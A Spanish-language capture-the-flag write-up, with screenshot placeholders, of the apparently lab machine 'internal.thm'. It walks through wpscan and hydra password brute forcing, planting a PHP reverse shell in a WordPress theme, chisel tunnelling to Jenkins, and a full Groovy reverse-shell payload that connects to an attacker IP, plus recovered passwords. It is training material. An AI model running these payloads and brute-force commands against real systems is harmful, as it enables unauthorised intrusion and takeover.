Hacemos el reconocimiento con nmap:
![[Pasted image 20230819113625.png]]
Y vemos lo que corre sobre el puerto 80:
![[Pasted image 20230819113722.png]]
Probamos en hacer fuzzing y vemos una serie de directorios, donde además nos encontramos con un wordpress:
![[Pasted image 20230819114104.png]]
Visualizamos la base de datos phpmyadmin:
![[Pasted image 20230819114138.png]]
Y si vamos al directorio blog vemos que no carga bien:
![[Pasted image 20230819113933.png]]
Por tanto vamos a añadir el internal.thm al /etc/hosts:
![[Pasted image 20230819114021.png]]
Y ya carga bien:
![[Pasted image 20230819114053.png]]
Ahora vamos a probar en hacer otro escaneo dentro de este wordpress con gobuster, donde encontramos varios directorios; y entre ellos un panel de login:
![[Pasted image 20230819114258.png]]
![[Pasted image 20230819114430.png]]
Con wpscan probamos en hacer una enumeración, donde vemos que nos encuentra el usuario admin:
```bash
wpscan --url http://internal.thm/blog --enumerate u,vp
```
![[Pasted image 20230819114644.png]]
Por tanto ahora vamos a hacer un ataque de fuerza bruta con wpscan de la siguiente forma:
```bash
wpscan --url http://internal.thm/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```
Y vemos que la contraseña es la siguiente:
```bash
admin:my2boys
```
![[Pasted image 20230819115042.png]]
Por tanto iniciamos sesión con estas credenciales:
![[Pasted image 20230819114917.png]]
Una vez dentro, en appearance y luego en theme editor, vemos que podemos colar una webshell:
![[Pasted image 20230819114955.png]]
Podemos insertarlo en el 404 template:
![[Pasted image 20230819115022.png]]
Por tanto preparamos el php malicioso de pentest monkey poniendo la IP y puerto de atacante:
![[Pasted image 20230819115125.png]]
Y lo pegamos dentro del wordpress en el footer.php:
![[Pasted image 20230819115524.png]]
De tal forma que si accedemos a internal.thm/blog/ nos habremos enviado la reverse shell:
![[Pasted image 20230819115639.png]]
![[Pasted image 20230819115647.png]]
Intentamos acceder al usuario aubreanna pero no podemos:
![[Pasted image 20230819115736.png]]
Si miramos dentro del directorio /opt, vemos que tenemos las credenciales del usuario aubreanna:
```
aubreanna:bubb13guM!@#123
```
![[Pasted image 20230819115820.png]]
Probamos en acceder vía ssh y ya estamos dentro:
![[Pasted image 20230819115918.png]]
Una vez dentro, nos encontramos con un archivo que dice que está corriendo un jenkins en una IP por el puerto 8080:
![[Pasted image 20230819120025.png]]
Vemos que efectivamente existe esta IP:
![[Pasted image 20230819125930.png]]
Si queremos llegar a esta IP tenemos que usar chisel, por lo que lo compartimos con la máquina víctima:
![[Pasted image 20230819120141.png]]
![[Pasted image 20230819120150.png]]
En nuestra máquina atacante, nos ponemos en escucha con chisel por el puerto 8001, que es donde está corriendo el servicio jenkins en la máquina víctima:
```bash
./chisel server --reverse -p 8001
```
![[Pasted image 20230819120303.png]]
Y ahora en la máquina víctima quiero decir que el puerto 8080 de la máquina víctima se convierta en el 443 de mi máquina atacante; y todo esto enviándose por el puerto 8001 que es donde estará chisel escuchando:
```bash
./chisel client 10.8.100.91:8001 R:443:127.0.0.1:8080
```
![[Pasted image 20230819121805.png]]
![[Pasted image 20230819121812.png]]
Y ahora si accedemos al puerto 443 de mi máquina local, veremos que hay un jenkins corriendo:
![[Pasted image 20230819121850.png]]
Si queremos hacer un ataque de fuerza bruta, tendremos que interceptar la petición http con burp suite y atacar con hydra:
![[Pasted image 20230819122055.png]]
![[Pasted image 20230819122106.png]]
Por tanto estos parámetros los ponemos en el hydra, aunque primero debemos tomar nota del mensaje de error que sale en el jenkins para que hydra sepa cuando un intento es fallido:
![[Pasted image 20230819122803.png]]
Y ahora ya podemos lanzar el ataque con estos parámetros:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 443 -f http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password'
```
Y nos encuentra la contraseña:
![[Pasted image 20230819123039.png]]
```
admin:spongebob
```
Y estamos dentro:
![[Pasted image 20230819123124.png]]
En jenkins hay un apartado que es para ejecutar plugins que se llama script console, el cual está dentro de manage jenkins:
![[Pasted image 20230819123216.png]]
Y aquí una vez dentro, tenemos que leer el contenido del archivo que queramos pero en lenguaje java, el cual nos puede ayudar chatgpt:
![[Pasted image 20230819123423.png]]
Este es el código generado:
```bash
def filePath = '/etc/passwd'

try {
    def fileContents = new File(filePath).text
    println("Contenido del archivo:\n$fileContents")
} catch (Exception e) {
    println("Error al leer el archivo: ${e.message}")
}
```
Y vemos que nos lee el contenido:
![[Pasted image 20230819123452.png]]
Probamos ahora con la ejecución del comando ls, con la ayuda de chatgpt:
![[Pasted image 20230819124133.png]]
```bash
def command = 'ls'

try {
    def process = command.execute()
    process.waitFor()
    
    if (process.exitValue() == 0) {
        def output = process.text
        println("Salida del comando $command:\n$output")
    } else {
        def errorOutput = process.err.text
        println("Error al ejecutar el comando $command:\n$errorOutput")
    }
} catch (Exception e) {
    println("Error al ejecutar el comando $command: ${e.message}")
}
```
![[Pasted image 20230819124153.png]]
De todos modos si miramos por internet, en esta web tenemos unas instrucciones de un código para enviarnos la reverse shell:
```bash
https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
```
![[Pasted image 20230819125513.png]]
```bash
String host="10.8.100.91";
int port=444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Lo ejecutamos y recibimos la reverse shell:
![[Pasted image 20230819125549.png]]
![[Pasted image 20230819125559.png]]
Y vemos que efectivamente estamos dentro del jenkins:
![[Pasted image 20230819125625.png]]
Y dentro de /opt nos encontramos con una nota:
![[Pasted image 20230819125703.png]]
Donde tenemos una contraseña de root:
```
root:tr0ub13guM!@#123
```
Y podemos entrar vía ssh como root a la máquina víctima:
![[Pasted image 20230819125824.png]]
